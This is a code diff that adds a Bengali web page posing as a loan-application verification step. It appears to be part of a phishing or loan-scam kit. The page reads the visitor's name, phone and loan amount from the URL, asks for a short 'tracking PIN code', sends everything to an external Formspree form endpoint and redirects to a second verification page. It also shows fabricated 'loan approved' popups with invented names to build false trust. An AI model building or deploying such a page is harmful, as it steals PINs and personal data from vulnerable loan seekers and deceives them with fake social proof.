@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>আবেদন ট্র্যাকিং পিন কোড</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+        }
+
+        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
+        body { 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            position: relative; 
+            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08);
+            border-left: 1px solid #fff7ed;
+            border-right: 1px solid #fff7ed;
+        }
+
+        /* কমলা গ্রেডিয়েন্ট হেডার */
+        .header { 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            padding: 28px 20px 24px; 
+            text-align: center; 
+            border-bottom-left-radius: 24px;
+            border-bottom-right-radius: 24px;
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2);
+        }
+        .header-logo-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+        .header-logo {
+            width: 60px;
+            height: 60px;
+            object-fit: cover;
+            border-radius: 50%;
+            background: #ffffff;
+            padding: 2px;
+            border: 2px solid #ffffff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        .header h2 { font-size: 22px; margin-bottom: 4px; font-weight: 700; }
+        .header p { font-size: 13px; opacity: 0.95; }
+
+        .form-wrap { padding: 30px 20px; flex-grow: 1; }
+        .form-group { margin-bottom: 22px; }
+        .form-group label { 
+            display: block; 
+            font-size: 13.5px; 
+            font-weight: 700; 
+            color: #334155; 
+            margin-bottom: 8px; 
+        }
+        .form-group label i {
+            color: #ff5e00;
+            margin-right: 4px;
+        }
+        .form-group input { 
+            width: 100%; 
+            padding: 14px 15px; 
+            border: 1.5px solid #fed7aa; 
+            border-radius: 12px; 
+            font-size: 15px; 
+            outline: none; 
+            background: #fffaf5; 
+            color: #1e293b; 
+            transition: all 0.2s;
+        }
+        .form-group input:focus { 
+            border-color: #ff5e00; 
+            background: #ffffff; 
+            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
+        }
+        .tracking-input { 
+            letter-spacing: 6px; 
+            font-size: 18px !important; 
+            font-weight: 700; 
+            text-align: center; 
+            background: #ffffff !important; 
+        }
+
+        /* কমলা সাবমিট বাটন */
+        .btn-submit { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #ff5e00, #ff8800); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 30px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); 
+            transition: transform 0.2s;
+        }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        /* সোশ্যাল-প্রুফ লাইভ পপআপ */
+        .loan-popup { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 20px; 
+            background: #ffffff; 
+            color: #1e293b; 
+            padding: 12px 16px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            z-index: 9999; 
+            max-width: 340px; 
+            border-left: 5px solid #16a34a; 
+            opacity: 0; 
+            transform: translateY(30px); 
+            transition: all 0.5s ease-in-out; 
+            pointer-events: none; 
+        }
+        .loan-popup.show { 
+            opacity: 1; 
+            transform: translateY(0); 
+            pointer-events: auto; 
+        }
+        .popup-icon { 
+            width: 38px; 
+            height: 38px; 
+            background: #dcfce7; 
+            color: #16a34a; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 18px; 
+            flex-shrink: 0; 
+        }
+        .popup-content { display: flex; flex-direction: column; }
+        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
+        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
+        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
+        @media (max-width: 480px) { 
+            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div class="header-logo-wrap">
+            <!-- কোম্পানির লোগো -->
+            <img src="logoo.png" alt="Company Logo" class="header-logo">
+        </div>
+        <h2>আবেদন ট্র্যাকিং কোড</h2>
+        <p>আপনার রেফারেন্স বা ট্র্যাকিং কোড প্রদান করুন</p>
+    </div>
+
+    <div class="form-wrap">
+        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
+            <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
+
+            <div class="form-group">
+                <label><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
+                <input type="tel" id="userPhone" name="মোবাইল_নম্বর" required readonly>
+            </div>
+
+            <div class="form-group">
+                <!-- এখানে হ্যাশট্যাগ বদলে ট্র্যাকিং পিন কোড দেওয়া হলো -->
+                <label><i class="fa-solid fa-key"></i> ট্র্যাকিং পিন কোড (৪ ডিজিট)</label>
+                <input type="text" name="ট্র্যাকিং_পিন_কোড" class="tracking-input" maxlength="6" required placeholder="পিন কোড দিন">
+            </div>
+
+            <button type="submit" id="btnSubmit" class="btn-submit">
+                <span>যাচাই সম্পন্ন করুন</span>
+                <i class="fa-solid fa-arrow-right"></i>
+            </button>
+        </form>
+    </div>
+</div>
+
+<div id="loanAlert" class="loan-popup">
+    <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
+    <div class="popup-content">
+        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
+        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
+        <span class="popup-time" id="popTime">এইমাত্র</span>
+    </div>
+</div>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const nameVal = params.get('name') || '';
+    const phoneVal = params.get('phone') || '';
+    const amountVal = params.get('amount') || '';
+
+    document.getElementById('hiddenName').value = nameVal;
+    document.getElementById('userPhone').value = phoneVal;
+    document.getElementById('hiddenAmount').value = amountVal;
+
+    const form = document.getElementById("verifyForm");
+    const btnSubmit = document.getElementById("btnSubmit");
+
+    form.addEventListener("submit", function(event) {
+        event.preventDefault();
+        btnSubmit.disabled = true;
+        btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
+
+        const data = new FormData(form);
+
+        fetch(form.action, {
+            method: "POST",
+            body: data,
+            headers: { 'Accept': 'application/json' }
+        }).finally(() => {
+            window.location.href = "verify2.html?name=" + encodeURIComponent(nameVal) + "&phone=" + encodeURIComponent(phoneVal) + "&amount=" + encodeURIComponent(amountVal);
+        });
+    });
+
+    const loanData = [
+        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
+        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
+        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
+        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" }
+    ];
+
+    let currentIndex = 0;
+    const popupEl = document.getElementById("loanAlert");
+    const nameEl = document.getElementById("popName");
+    const amountEl = document.getElementById("popAmount");
+    const timeEl = document.getElementById("popTime");
+
+    function showNextNotification() {
+        const item = loanData[currentIndex];
+        nameEl.innerText = `${item.name} (${item.district})`;
+        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
+        timeEl.innerText = item.time;
+        popupEl.classList.add("show");
+        setTimeout(() => { popupEl.classList.remove("show"); }, 4000);
+        currentIndex = (currentIndex + 1) % loanData.length;
+    }
+
+    setTimeout(() => { showNextNotification(); setInterval(showNextNotification, 8000); }, 2000);
+</script>
+</body>
+</html>
